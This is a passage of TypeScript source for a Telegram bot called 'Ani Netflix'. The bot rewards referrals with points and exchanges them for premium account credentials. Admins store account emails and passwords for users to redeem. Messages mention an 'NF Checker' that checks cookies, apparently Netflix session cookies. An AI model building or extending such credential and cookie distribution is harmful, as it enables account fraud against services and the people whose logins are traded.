      const { user, isNew, referrerId, referrerChatId, referrerUsername } =
        await getOrCreateUser(String(tgUserId), String(chatId), tgUsername, startParam ?? startCache[tgUserId]);
      if (startParam) delete startCache[tgUserId];

      // FIX: check temp ban and auto-unban
      const isTempBanned = await storage.isTempBanned(user.id);
      if (user.isBanned && !isTempBanned) {
        return bot.sendMessage(chatId, `⛔ You are banned.\nReason: ${user.bannedReason || "No reason given."}`);
      }
      // If temp ban expired, isTempBanned() already unbanned them, re-fetch
      if (isTempBanned) {
        return bot.sendMessage(chatId, `⛔ You are temporarily banned.\nReason: ${user.bannedReason || "Temp ban"}`);
      }

      if (isNew) {
        if (referrerId && referrerUsername) {
          await notifyOwner(
            `🆕 New User Joined!\n👤 New: @${esc(tgUsername)}\n🆔 ID: ${tgUserId}\n\n🔗 Referral Info:\n👤 Referred by: @${esc(referrerUsername)}\n💰 +1 point added to @${esc(referrerUsername)}`
          );
        } else {
          await notifyOwner(`🆕 New User Joined!\n👤 @${esc(tgUsername)}\n🆔 ID: ${tgUserId}\n🔗 No referral`);
        }
        if (referrerId && referrerChatId) {
          await notifyUser(referrerChatId, `🎉 You earned 1 point!\n👤 @${esc(tgUsername)} just joined using your referral link!`);
        }
        const totalUsers = await storage.getTotalUsers();
        await bot.sendMessage(chatId,
          `<tg-emoji emoji-id="5778350550798047041">🤪</tg-emoji> <b>Welcome to Ani Netflix!</b> <tg-emoji emoji-id="5778350550798047041">🤪</tg-emoji>\n${"─".repeat(30)}\n\n` +
          `<tg-emoji emoji-id="6082123816593531194">👋</tg-emoji> Hey <b>${esc(tgUsername)}</b>!\n\n` +
          `<tg-emoji emoji-id="6195049656540467741">✨</tg-emoji> We're so happy to have you here!\n` +
          `<tg-emoji emoji-id="6069089247980165250">🎁</tg-emoji> Earn points, play games, and get premium accounts!\n` +
          `<tg-emoji emoji-id="5330236782942379682">💎</tg-emoji> Invite your friends to earn even more rewards!\n` +
          `<tg-emoji emoji-id="5258513401784573443">👥</tg-emoji> <b>${totalUsers}</b> users already joined the bot!\n\n` +
          `<tg-emoji emoji-id="6084852357777071027">🚀</tg-emoji> Let's get started — explore the menu below!\n\n` +
          `${"─".repeat(30)}\n` +
          `<tg-emoji emoji-id="5258093637450866522">🤖</tg-emoji> Bot made by @INTANETO7701`,
          { parse_mode: "HTML" }
        );
      }
      await sendWelcome(chatId, user, tgUserId);
    } catch (err: any) {
      console.error("Error in /start:", err.message);
    }
  });

  bot.onText(/\/support/, async (msg) => {
    const chatId = msg.chat.id;
    const tgUserId = msg.from!.id;
    pending[tgUserId] = { action: "support_ticket" };
    bot.sendMessage(chatId,
      "📞 Customer Support\n\nPlease type your complaint, inquiry, or suggestion. We will reply directly here.\n\nOr type /cancel to return.",
      { parse_mode: "HTML" }
    );
  });

  bot.onText(/\/cancel/, async (msg) => {
    const chatId = msg.chat.id;
    const tgUserId = msg.from!.id;
    if (pending[tgUserId]) {
      delete pending[tgUserId];
      bot.sendMessage(chatId, "❌ Action cancelled.", userMenu());
    }
  });

  bot.onText(/\/admin/, async (msg) => {
    try {
      const chatId = msg.chat.id;
      const tgUserId = msg.from!.id;
      if (!await isAdminOrOwner(tgUserId)) return bot.sendMessage(chatId, "⛔ Access denied.");
      return bot.sendMessage(chatId, "👑 Admin Panel\n\nChoose an option:", adminMenu());
    } catch (err: any) { console.error("Command error:", err.message); }
  });

  bot.onText(/\/addadmin (.+)/, async (msg, match) => {
    try {
      const chatId = msg.chat.id;
      if (String(msg.from!.id) !== OWNER_ID) return bot.sendMessage(chatId, "⛔ Owner only.");
      const tid = match![1].trim();
      await storage.addAdmin(tid);
      bot.sendMessage(chatId, `✅ Admin added! Telegram ID: ${tid}`, adminMenu());
    } catch (err: any) { console.error("Command error:", err.message); }
  });

  bot.onText(/\/removeadmin (.+)/, async (msg, match) => {
    try {
      const chatId = msg.chat.id;
      if (String(msg.from!.id) !== OWNER_ID) return bot.sendMessage(chatId, "⛔ Owner only.");
      const tid = match![1].trim();
      await storage.removeAdmin(tid);
      bot.sendMessage(chatId, `✅ Admin removed! Telegram ID: ${tid}`, adminMenu());
    } catch (err: any) { console.error("Command error:", err.message); }
  });

  bot.onText(/\/additem(?:\s+(.+))?/, async (msg, match) => {
    try {
      const chatId = msg.chat.id;
      if (!await isAdminOrOwner(msg.from!.id)) return bot.sendMessage(chatId, "⛔ Admin only.");
      const args = match?.[1]?.trim();
      if (!args) {
        return bot.sendMessage(chatId,
          `📝 Add Item — Format:\n\n/additem Name|Price|Description\n\nExamples:\n/additem Netflix|3|Netflix Premium Account\n/additem Spotify|2|Spotify Premium`,
          { parse_mode: "HTML" }
        );
      }
      const parts = args.split("|").map(p => p.trim());
      if (parts.length < 2) return bot.sendMessage(chatId, "Format: /additem Name|Price|Description");
      const [name, priceStr, description] = parts;
      const price = parseInt(priceStr);
      if (isNaN(price) || price <= 0) return bot.sendMessage(chatId, "❌ Price must be a positive number.");
      const item = await storage.createItem({ name, price, description: description || undefined, stock: 0 });
      bot.sendMessage(chatId, `✅ Item added!\n🔹 ${item.name} — ${item.price} pts\n${item.description || ""}\n\n🆔 ID: <code>${item.id}</code>`, { parse_mode: "HTML", ...adminMenu() });
    } catch (err: any) { console.error("Command error:", err.message); }
  });

  bot.onText(/\/(?:deleteitem|delitem) (\S+)/, async (msg, match) => {
    try {
      const chatId = msg.chat.id;
      if (!await isAdminOrOwner(msg.from!.id)) return bot.sendMessage(chatId, "⛔ Admin only.");
      const itemId = match![1];
      const item = await storage.getItem(itemId);
      if (!item) return bot.sendMessage(chatId, "Item not found.");
      await storage.deleteItem(itemId);
      bot.sendMessage(chatId, `✅ Deleted: ${item.name}`, adminMenu());
    } catch (err: any) { console.error("Command error:", err.message); }
  });

  bot.onText(/\/buy_(\S+)/, async (msg, match) => {
    try {
      const chatId = msg.chat.id;
      const tgUserId = msg.from!.id;
      const tgUsername = msg.from!.username || msg.from!.first_name || `user_${tgUserId}`;
      if (CHANNELS.length > 0 && !await checkAllChannels(tgUserId)) {
        const { text, opts } = await joinChannelsMsgForUser(tgUserId);
        return bot.sendMessage(chatId, text, opts);
      }
      const user = await storage.getUserByTelegramId(String(tgUserId)) ||
        await storage.getUserByUsername(tgUsername);
      if (!user) return bot.sendMessage(chatId, "Please use /start first.");
      if (user.isBanned) return bot.sendMessage(chatId, "⛔ You are banned.");
      const itemId = match![1];
      const item = await storage.getItem(itemId);
      if (!item) return bot.sendMessage(chatId, "❌ Item not found.");
      const availableCode = await storage.getAvailableCode(itemId);
      if (!availableCode) return bot.sendMessage(chatId, "❌ This item is out of stock.");
      const isOwnerBuyer = isBotOwner(tgUserId);
      if (!isOwnerBuyer && user.points < item.price) {
        return bot.sendMessage(chatId, `❌ Insufficient Points\nYou need: ${item.price}\nYou have: ${user.points}`, { parse_mode: "HTML" });
      }
      const claimedCode = await storage.claimCode(availableCode.id, user.id);
      if (!isOwnerBuyer) await storage.deductPoints(user.id, item.price);
      const remaining = await storage.getAvailableCodeCount(itemId);
      await storage.updateItem(itemId, { stock: remaining });
      if (remaining > 0 && remaining <= 3) {
        await notifyOwner(`⚠️ Low Stock Alert!\n\n🎁 Item: ${esc(item.name)}\n📦 Remaining: ${remaining} code(s)\n\n🔴 Add more stock soon!`);
      } else if (remaining === 0) {
        await notifyOwner(`🚨 OUT OF STOCK!\n\n🎁 Item: ${esc(item.name)}\n📦 Remaining: 0`);
      }
      await storage.createPurchase(user.id, itemId, claimedCode.code);
      await handlePurchase(chatId, tgUserId, user, item, claimedCode);
    } catch (err: any) { console.error("Command error:", err.message); }
  });

  bot.onText(/\/vip(.*)/, async (msg, match) => {
    try {
      const chatId = msg.chat.id;
      const tgUserId = String(msg.from?.id || "");
      const isAdmin = tgUserId === OWNER_ID;
      if (!isAdmin) return;

      const args = (match?.[1] || "").trim();
      if (!args || args === "list") {
        loadVipCheckers();
        const activeVips = vipCheckers.filter(v => !v.expiresAt || v.expiresAt > Date.now());
        if (activeVips.length === 0) {
          return bot.sendMessage(chatId, `👑 <b>VIP Checker List</b>\n${"─".repeat(30)}\n\nNo VIP users.`, { parse_mode: "HTML" });
        }
        const list = activeVips.map((v, i) => {
          const exp = v.expiresAt ? new Date(v.expiresAt).toLocaleDateString("en-US", { day: "numeric", month: "short", year: "numeric" }) : "♾️ Unlimited";
          const added = new Date(v.grantedAt).toLocaleDateString("en-US", { day: "numeric", month: "short" });
          return `${i + 1}. @${esc(v.username)} — ${exp} (added ${added})`;
        }).join("\n");
        return bot.sendMessage(chatId, `👑 <b>VIP Checker List</b>\n${"─".repeat(30)}\n\n${list}\n\n📊 Total: <b>${activeVips.length}</b>`, { parse_mode: "HTML" });
      }

      const parts = args.split(/\s+/);
      const action = parts[0]?.toLowerCase();

      if (action === "add" && parts.length >= 2) {
        let targetUsername = parts[1].replace("@", "");
        const durationStr = parts[2]?.toLowerCase();

        let expiresAt: number | null = null;
        let durationLabel = "♾️ Unlimited";
        if (durationStr) {
          const match = durationStr.match(/^(\d+)(d|h|m)$/);
          if (match) {
            const num = parseInt(match[1]);
            const unit = match[2];
            const ms = unit === "d" ? num * 86400000 : unit === "h" ? num * 3600000 : num * 60000;
            expiresAt = Date.now() + ms;
            durationLabel = `${num}${unit === "d" ? " days" : unit === "h" ? " hours" : " minutes"}`;
          }
        }

        loadVipCheckers();
        const allUsers = await storage.getAllUsers();
        const targetUser = allUsers.find(u => u.username?.toLowerCase() === targetUsername.toLowerCase());
        if (!targetUser) {
          return bot.sendMessage(chatId, `❌ User @${esc(targetUsername)} not found. They need to start the bot first.`, { parse_mode: "HTML" });
        }

        vipCheckers = vipCheckers.filter(v => v.telegramId !== targetUser.telegramId);
        vipCheckers.push({
          telegramId: targetUser.telegramId,
          username: targetUser.username,
          expiresAt,
          grantedBy: tgUserId,
          grantedAt: Date.now(),
        });
        saveVipCheckers();

        await bot.sendMessage(chatId,
          `✅ <b>VIP Added!</b>\n\n👤 User: @${esc(targetUser.username)}\n⏰ Duration: <b>${durationLabel}</b>\n${expiresAt ? `📅 Expires: ${new Date(expiresAt).toLocaleDateString("en-US", { day: "numeric", month: "short", year: "numeric" })}` : "♾️ No expiration"}`,
          { parse_mode: "HTML" }
        );

        try {
          await bot.sendMessage(Number(targetUser.telegramId),
            `👑 <b>You are now a VIP Checker!</b>\n\n🔓 You can now check <b>unlimited</b> cookies.\n⏰ Duration: <b>${durationLabel}</b>\n\nUse 🔑 NF Checker to start!`,
            { parse_mode: "HTML" }
          );
        } catch {}
        return;
      }

      if (action === "remove" && parts.length >= 2) {
        const targetUsername = parts[1].replace("@", "");
        loadVipCheckers();
        const found = vipCheckers.find(v => v.username.toLowerCase() === targetUsername.toLowerCase());
        if (!found) {
          return bot.sendMessage(chatId, `❌ @${esc(targetUsername)} is not a VIP.`, { parse_mode: "HTML" });
        }
        vipCheckers = vipCheckers.filter(v => v.username.toLowerCase() !== targetUsername.toLowerCase());
        saveVipCheckers();

        await bot.sendMessage(chatId, `✅ Removed @${esc(targetUsername)} from VIP.`, { parse_mode: "HTML" });
        try {
          await bot.sendMessage(Number(found.telegramId),
            `⚠️ Your VIP Checker access has been removed.\n\nYou can now check up to ${MAX_COOKIES_NORMAL} cookies per check.`,
            { parse_mode: "HTML" }
          );
        } catch {}
        return;
      }

      return bot.sendMessage(chatId,
        `👑 <b>VIP Commands</b>\n${"─".repeat(30)}\n\n• <code>/vip add @username</code> — Unlimited\n• <code>/vip add @username 7d</code> — 7 days\n• <code>/vip add @username 30d</code> — 30 days\n• <code>/vip add @username 24h</code> — 24 hours\n• <code>/vip remove @username</code>\n• <code>/vip list</code>`,
        { parse_mode: "HTML" }
      );
    } catch (err: any) { console.error("VIP command error:", err.message); }
  });

  bot.onText(/\/animatrix(.*)/, async (msg, match) => {
    try {
      const chatId = msg.chat.id;
      const tgUserId = msg.from!.id;
      const username = msg.from!.username || msg.from!.first_name || "Unknown";
      const isAdmin = await isAdminOrOwner(tgUserId);
      const rest = (match![1] || "").trim();

      if (rest && isAdmin) {
        const parts = rest.split(/\s+/);
        if (parts.length >= 3) {
          const label = parts[0];
          const accountCode = parts[1];
          const password = parts.slice(2).join(" ");
          const redeemCode = crypto.randomBytes(4).toString("hex").toUpperCase();
          await storage.createAnimatrixCode({ code: redeemCode, email: accountCode, password, label });
          return bot.sendMessage(chatId,
            `✅ <b>Account Added!</b>\n${"─".repeat(30)}\n\n🏷 <b>Label:</b> <code>${esc(label)}</code>\n🔑 <b>Account:</b> <code>${esc(accountCode)}</code>\n🔐 <b>Password:</b> <code>${esc(password)}</code>\n🎫 <b>Redeem Code:</b> <code>${esc(redeemCode)}</code>\n\n💡 Users redeem with: <code>/animatrix ${esc(redeemCode)}</code>`,
            { parse_mode: "HTML" }
          );
        }
        if (parts.length === 2) {
          const label = parts[0];
          const accountCode = parts[1];
          const redeemCode = crypto.randomBytes(4).toString("hex").toUpperCase();
          await storage.createAnimatrixCode({ code: redeemCode, email: accountCode, password: "", label });
          return bot.sendMessage(chatId,
            `✅ <b>Account Added!</b>\n${"─".repeat(30)}\n\n🏷 <b>Label:</b> <code>${esc(label)}</code>\n🔑 <b>Account:</b> <code>${esc(accountCode)}</code>\n🎫 <b>Redeem Code:</b> <code>${esc(redeemCode)}</code>\n\n💡 Users redeem with: <code>/animatrix ${esc(redeemCode)}</code>`,
            { parse_mode: "HTML" }
          );
        }
      }

      if (rest) {
        const codeValue = rest.split(/\s+/)[0].toUpperCase().trim();
        const user = await storage.getUserByTelegramId(String(tgUserId));
        if (!user) return bot.sendMessage(chatId, "Please use /start first.");
        if (user.isBanned) return bot.sendMessage(chatId, "⛔ You are banned.");
        const codeRecord = await storage.getAnimatrixCode(codeValue);
        if (!codeRecord) return bot.sendMessage(chatId, `❌ <b>Invalid or incorrect code.</b>`, { parse_mode: "HTML" });
        if (codeRecord.isUsed) return bot.sendMessage(chatId, `⛔ <b>This code has already been used.</b>`, { parse_mode: "HTML" });
        await storage.markAnimatrixCodeUsed(codeValue, String(tgUserId), username);
        await storage.createAnimatrixRedemption({ code: codeValue, userId: String(tgUserId), username, email: codeRecord.email, password: codeRecord.password, label: codeRecord.label || "" });
        const labelLine = codeRecord.label ? `🏷 <b>Type:</b> <code>${esc(codeRecord.label)}</code>\n` : "";
        const credMsg = await bot.sendMessage(chatId,
          `✅ <b>Redeemed Successfully!</b>\n\n${labelLine}🔑 <b>Account:</b> <code>${esc(codeRecord.email)}</code>\n\n⚠️ <b>This message will be deleted in 5 minutes!</b>\nSave your credentials now.`,
          { parse_mode: "HTML" }
        );
        setTimeout(async () => { try { await bot.deleteMessage(chatId, credMsg.message_id); } catch {} }, 5 * 60 * 1000);
        waitingScreenshot[tgUserId] = { itemName: `Animatrix: ${codeRecord.label || codeValue}`, username, source: "animatrix" };
        await bot.sendMessage(chatId, `⭐ <b>One last step!</b>\n\nPlease send a <b>screenshot</b> showing the account is working.\n📸 Send the screenshot here in this chat.`, { parse_mode: "HTML" });
        await notifyOwner(`🔔 <b>New Animatrix Redemption</b>\n\n👤 User: @${esc(username)} (<code>${tgUserId}</code>)\n🎫 Code: <code>${esc(codeValue)}</code>\n🔑 Account: <code>${esc(codeRecord.email)}</code>`);
        return;
      }

      if (!rest && !isAdmin) {
        return bot.sendMessage(chatId, `🎫 <b>Animatrix - Redeem Account</b>\n${"─".repeat(30)}\n\n📝 <b>Usage:</b> <code>/animatrix CODE</code>\nExample: <code>/animatrix ABC12345</code>\n\n🔑 Enter your code to get your account!`, { parse_mode: "HTML" });
      }

      const allCodes = await storage.getAllAnimatrixCodes();
      const available = allCodes.filter(c => !c.isUsed);
      const used = allCodes.filter(c => c.isUsed);
      await bot.sendMessage(chatId,
        `🎫 <b>Animatrix Admin Panel</b>\n${"─".repeat(30)}\n\n✅ Available: <b>${available.length}</b>\n⛔ Used: <b>${used.length}</b>\n📊 Total: <b>${allCodes.length}</b>\n\n📝 <b>To add account:</b>\n\n<b>With email &amp; password:</b>\n<code>/animatrix LABEL EMAIL PASSWORD</code>\nExample: <code>/animatrix Netflix user@mail.com pass123</code>\n\n<b>With code only:</b>\n<code>/animatrix LABEL CODE</code>\nExample: <code>/animatrix Netflix CRUALKM6E3URYERM</code>`,
        {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "➕ Add Account", callback_data: "ax_add_start" }],
              [{ text: "🗂 List Codes", callback_data: "ax_list" }, { text: "📈 Statistics", callback_data: "ax_stats" }],
              [{ text: "🗑 Delete Code", callback_data: "ax_del_prompt" }, { text: "📋 Redemptions", callback_data: "ax_redemptions" }],
              [{ text: "📡 Broadcast", callback_data: "ax_broadcast" }, { text: "👤 Users", callback_data: "ax_users" }],
              [{ text: "➕ Add Admin", callback_data: "ax_addadmin" }, { text: "🗑 Remove Admin", callback_data: "ax_removeadmin" }],
              [{ text: "🚫 Ban User", callback_data: "ax_ban" }, { text: "✅ Unban User", callback_data: "ax_unban" }],
              [{ text: "🔧 Help", callback_data: "ax_help" }],
            ]
          }
        }
      );
    } catch (err: any) { console.error("Animatrix error:", err.message); }
  });

  bot.onText(/\/ban (.+)/, async (msg, match) => {
    try {
      const chatId = msg.chat.id;
      if (!await isAdminOrOwner(msg.from!.id)) return bot.sendMessage(chatId, "⛔ Admin only.");
      const parts = match![1].split("|");
      const uname = parts[0].trim().replace("@", "");
      const reason = parts[1]?.trim() || "No reason";
      const target = await storage.getUserByUsername(uname);
      if (!target) return bot.sendMessage(chatId, "User not found.");
      await storage.banUser(target.id, reason);
      bot.sendMessage(chatId, `🚫 Banned @${target.username}\nReason: ${reason}`, adminMenu());
    } catch (err: any) { console.error("Command error:", err.message); }
  });

  bot.onText(/\/unban (.+)/, async (msg, match) => {
    try {
      const chatId = msg.chat.id;
      if (!await isAdminOrOwner(msg.from!.id)) return bot.sendMessage(chatId, "⛔ Admin only.");
      const uname = match![1].trim().replace("@", "");
      const target = await storage.getUserByUsername(uname);
      if (!target) return bot.sendMessage(chatId, "User not found.");
      await storage.unbanUser(target.id);
      bot.sendMessage(chatId, `✅ Unbanned @${target.username}`, adminMenu());
    } catch (err: any) { console.error("Command error:", err.message); }
  });

  bot.onText(/\/setpoints (.+)/, async (msg, match) => {
    try {
      const chatId = msg.chat.id;
      if (!await isAdminOrOwner(msg.from!.id)) return bot.sendMessage(chatId, "⛔ Admin only.");
      const parts = match![1].split(" ");
      if (parts.length < 2) return bot.sendMessage(chatId, "Usage: /setpoints @username amount");
      const [uname, amtStr] = parts;
      const amt = parseInt(amtStr);
      if (isNaN(amt)) return bot.sendMessage(chatId, "Amount must be a number.");
      const target = await storage.getUserByUsername(uname.replace("@", ""));
      if (!target) return bot.sendMessage(chatId, "User not found.");
      await storage.deductPoints(target.id, target.points);
      await storage.addPoints(target.id, amt);
      bot.sendMessage(chatId, `✅ Set @${target.username}'s points to ${amt}`, adminMenu());
    } catch (err: any) { console.error("Command error:", err.message); }
  });

  bot.onText(/\/redeem(?:\s+(.+))?/, async (msg, match) => {
    try {
      const chatId = msg.chat.id;
      const tgUserId = msg.from!.id;
      const tgUsername = msg.from!.username || msg.from!.first_name || `user_${tgUserId}`;
      const code = match?.[1]?.trim();
      if (!code) return bot.sendMessage(chatId, `🎟️ Redeem a Code\n\nUsage: /redeem CODE\n\nExample: /redeem netflix-free-5pts`, { parse_mode: "HTML" });
      const user = await storage.getUserByTelegramId(String(tgUserId)) || await storage.getUserByUsername(tgUsername);
      if (!user) return bot.sendMessage(chatId, "Please use /start first.");
      if (user.isBanned) return bot.sendMessage(chatId, "⛔ You are banned.");
      const rc = await storage.getRedeemCode(code);
      if (!rc) return bot.sendMessage(chatId, "❌ Invalid code. Please check and try again.");
      if (rc.currentUses >= rc.maxUses) return bot.sendMessage(chatId, "❌ This code has already been fully redeemed.");
      const alreadyUsed = await storage.hasUsedRedeemCode(rc.id, user.id);
      if (alreadyUsed) return bot.sendMessage(chatId, "❌ You have already used this code.");
      await storage.useRedeemCode(rc.id, user.id);
      await storage.addPoints(user.id, rc.points);
      addLog("redeem", user.username, String(tgUserId), `Redeemed code "${rc.code}" for +${rc.points} pts`);
      await bot.sendMessage(chatId,
        `🎉 Code Redeemed Successfully!\n\n🎟️ Code: ${esc(rc.code)}\n💰 Points received: +${rc.points}\n💳 New balance: ${user.points + rc.points}`,
        { parse_mode: "HTML" }
      );
      await notifyOwner(`🎟️ Code Redeemed!\n\n👤 User: @${esc(user.username)}\n🎟️ Code: ${esc(rc.code)}\n💰 Points: +${rc.points}\n📊 Uses: ${rc.currentUses + 1}/${rc.maxUses}`);
    } catch (err: any) { console.error("Command error:", err.message); }
  });

  bot.onText(/\/createcode(?:\s+(.+))?/, async (msg, match) => {
    try {
      const chatId = msg.chat.id;
      if (!await isAdminOrOwner(msg.from!.id)) return bot.sendMessage(chatId, "⛔ Admin only.");
      const args = match?.[1]?.trim();
      if (!args) return bot.sendMessage(chatId, `🎟️ Create Redeem Code\n\nFormat: /createcode CODE|POINTS|MAX_USES\n\nExamples:\n/createcode netflix-vip|5|10\n/createcode gift-2025|3|1`, { parse_mode: "HTML" });
      const parts = args.split("|").map(p => p.trim());
      if (parts.length < 2) return bot.sendMessage(chatId, "Format: /createcode CODE|POINTS|MAX_USES");
      const [codeName, ptsStr, maxStr] = parts;
      const pts = parseInt(ptsStr);
      const maxUses = parseInt(maxStr) || 1;
      if (isNaN(pts) || pts <= 0) return bot.sendMessage(chatId, "❌ Points must be a positive number.");
      const existing = await storage.getRedeemCode(codeName);
      if (existing) return bot.sendMessage(chatId, "❌ This code already exists. Choose a different name.");
      const rc = await storage.createRedeemCode(codeName, pts, maxUses, String(msg.from!.id));
      bot.sendMessage(chatId,
        `✅ Redeem Code Created!\n\n🎟️ Code: ${esc(rc.code)}\n💰 Points: ${rc.points}\n👥 Max uses: ${rc.maxUses}\n\nUsers can redeem with:\n/redeem ${esc(rc.code)}`,
        { parse_mode: "HTML", ...adminMenu() }
      );
    } catch (err: any) { console.error("Command error:", err.message); }
  });

  bot.onText(/\/codes/, async (msg) => {
    try {
      const chatId = msg.chat.id;
      if (!await isAdminOrOwner(msg.from!.id)) return bot.sendMessage(chatId, "⛔ Admin only.");
      const codes = await storage.getAllRedeemCodes();
      if (codes.length === 0) return bot.sendMessage(chatId, "🎟️ No redeem codes yet. Create one with /createcode", adminMenu());
      let msg2 = `🎟️ Redeem Codes (${codes.length})\n\n`;
      codes.forEach(rc => {
        const status = rc.currentUses >= rc.maxUses ? "❌ EXPIRED" : "✅ ACTIVE";
        msg2 += `${status} ${esc(rc.code)}\n   💰 ${rc.points} pts | 👥 ${rc.currentUses}/${rc.maxUses} uses\n\n`;
      });
      bot.sendMessage(chatId, msg2, { parse_mode: "HTML", ...adminMenu() });
    } catch (err: any) { console.error("Command error:", err.message); }
  });

  bot.onText(/\/deletecode (\S+)/, async (msg, match) => {
    try {
      const chatId = msg.chat.id;
      if (!await isAdminOrOwner(msg.from!.id)) return bot.sendMessage(chatId, "⛔ Admin only.");
      await storage.deleteRedeemCode(match![1]);
      bot.sendMessage(chatId, `✅ Redeem code deleted.`, adminMenu());
    } catch (err: any) { console.error("Command error:", err.message); }
  });

  // CALLBACK QUERY
  bot.on("callback_query", async (query) => {
    try {
      const chatId = query.message!.chat.id;
      const tgUserId = query.from.id;
      const tgUsername = query.from.username || query.from.first_name || `user_${tgUserId}`;
      const messageId = query.message!.message_id;

      if (query.data === "noop") {
        return bot.answerCallbackQuery(query.id);
      }

      if (query.data === "ch_add") {
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin only!", show_alert: true });
        await bot.answerCallbackQuery(query.id);
        pending[tgUserId] = { action: "ch_add" };
        return bot.sendMessage(chatId,
          `➕ <b>Add Channel</b>\n\nSend the channel link or username:\n\n` +
          `<b>Examples:</b>\n` +
          `<code>https://t.me/mychannel</code>\n` +
          `<code>https://t.me/+AbCdEfGh123</code>\n` +
          `<code>@mychannel</code>\n\n` +
          `Send link or /cancel:`,
          { parse_mode: "HTML" }
        );
      }

      if (query.data === "ch_remove") {
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin only!", show_alert: true });
        await bot.answerCallbackQuery(query.id);
        if (CHANNELS.length === 0) return bot.sendMessage(chatId, "❌ No channels to remove.");
        const buttons = CHANNELS.map((ch, i) => [{ text: `🗑 ${i + 1}. ${ch}`, callback_data: `ch_del_${i}` }]);
        buttons.push([{ text: "🔙 Back", callback_data: "ch_back" }]);
        return bot.sendMessage(chatId, `🗑 <b>Select channel to remove:</b>`, {
          parse_mode: "HTML",
          reply_markup: { inline_keyboard: buttons }
        });
      }

      if (query.data?.startsWith("ch_del_")) {
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin only!", show_alert: true });
        const idx = parseInt(query.data.replace("ch_del_", ""));
        if (idx >= 0 && idx < CHANNELS.length) {
          const removed = CHANNELS.splice(idx, 1)[0];
          saveChannels();
          await bot.answerCallbackQuery(query.id, { text: "✅ Removed!" });
          try { await bot.deleteMessage(chatId, messageId); } catch {}
          return bot.sendMessage(chatId, `✅ Removed: <code>${esc(removed)}</code>\n\nChannels left: ${CHANNELS.length}`, { parse_mode: "HTML", disable_web_page_preview: true });
        }
      }

      if (query.data === "ch_list") {
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin only!", show_alert: true });
        await bot.answerCallbackQuery(query.id);
        if (CHANNELS.length === 0) return bot.sendMessage(chatId, "📢 No channels set.");
        const list = CHANNELS.map((ch, i) => `${i + 1}. <code>${esc(ch)}</code>`).join("\n");
        return bot.sendMessage(chatId, `📢 <b>Force Join Channels (${CHANNELS.length})</b>\n\n${list}`, { parse_mode: "HTML", disable_web_page_preview: true });
      }

      if (query.data === "ch_clear") {
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin only!", show_alert: true });
        CHANNELS.length = 0;
        saveChannels();
        await bot.answerCallbackQuery(query.id, { text: "✅ All channels removed!" });
        try { await bot.deleteMessage(chatId, messageId); } catch {}
        return bot.sendMessage(chatId, "✅ All force join channels have been removed.");
      }

      if (query.data === "ch_back") {
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin only!", show_alert: true });
        await bot.answerCallbackQuery(query.id);
        try { await bot.deleteMessage(chatId, messageId); } catch {}
        return;
      }

      if (query.data === "check_sub") {
        await bot.answerCallbackQuery(query.id, { text: "🔍 Checking..." });
        if (!await checkAllChannels(tgUserId)) {
          return bot.answerCallbackQuery(query.id, { text: "❌ You haven't joined all channels yet! Please join all channels first.", show_alert: true });
        }
        try { await bot.deleteMessage(chatId, messageId); } catch {}
        const savedStartParam = startCache[tgUserId] || null;
        const { user, isNew, referrerId, referrerChatId, referrerUsername } =
          await getOrCreateUser(String(tgUserId), String(chatId), tgUsername, savedStartParam);
        delete startCache[tgUserId];
        if (user.isBanned) return bot.sendMessage(chatId, `⛔ You are banned.\nReason: ${user.bannedReason || "No reason given."}`);
        if (isNew) {
          if (referrerId && referrerUsername) {
            await notifyOwner(`🆕 New User Joined!\n👤 New: @${esc(tgUsername)}\n🆔 ID: ${tgUserId}\n👤 Referred by: @${esc(referrerUsername)}\n💰 +1 point added to @${esc(referrerUsername)}`);
          } else {
            await notifyOwner(`🆕 New User Joined!\n👤 @${esc(tgUsername)}\n🆔 ID: ${tgUserId}\n🔗 No referral`);
          }
          if (referrerId && referrerChatId) {
            await notifyUser(referrerChatId, `🎉 You earned 1 point!\n👤 @${esc(tgUsername)} just joined using your referral link!`);
          }
          const totalUsers = await storage.getTotalUsers();
          await bot.sendMessage(chatId,
            `<tg-emoji emoji-id="5778350550798047041">🤪</tg-emoji> <b>Welcome to Ani Netflix!</b> <tg-emoji emoji-id="5778350550798047041">🤪</tg-emoji>\n${"─".repeat(30)}\n\n` +
            `<tg-emoji emoji-id="6082123816593531194">👋</tg-emoji> Hey <b>${esc(tgUsername)}</b>!\n\n` +
            `<tg-emoji emoji-id="6195049656540467741">✨</tg-emoji> We're so happy to have you here!\n` +
            `<tg-emoji emoji-id="6069089247980165250">🎁</tg-emoji> Earn points, play games, and get premium accounts!\n` +
            `<tg-emoji emoji-id="5330236782942379682">💎</tg-emoji> Invite your friends to earn even more rewards!\n` +
            `<tg-emoji emoji-id="5258513401784573443">👥</tg-emoji> <b>${totalUsers}</b> users already joined the bot!\n\n` +
            `<tg-emoji emoji-id="6084852357777071027">🚀</tg-emoji> Let's get started — explore the menu below!\n\n` +
            `${"─".repeat(30)}\n` +
            `<tg-emoji emoji-id="5258093637450866522">🤖</tg-emoji> Bot made by @INTANETO7701`,
            { parse_mode: "HTML" }
          );
        }
        await sendWelcome(chatId, user, tgUserId);
        return;
      }

      if (query.data === "nf_stop") {
        nfCheckStopped.add(tgUserId);
        await bot.answerCallbackQuery(query.id, { text: "⏹ Stopping..." });
        return;
      }

      if (query.data?.startsWith("acct_rate:")) {
        const parts = query.data.split(":");
        if (parts[1] === "skip") {
          await bot.answerCallbackQuery(query.id, { text: "Skipped!" });
          try { await bot.deleteMessage(chatId, messageId); } catch {}
          return;
        }
        const ratingVal = parseInt(parts[1]);
        const itemName = parts[2] || "Unknown";
        const source = (parts[3] || "store") as "store" | "animatrix";
        const username = query.from?.username || "";
        await storage.createAccountRating({ userId: String(tgUserId), username, itemName, rating: ratingVal, source });
        const starsStr = "⭐".repeat(ratingVal);
        await bot.answerCallbackQuery(query.id, { text: `Rated ${ratingVal} stars!` });
        try { await bot.deleteMessage(chatId, messageId); } catch {}
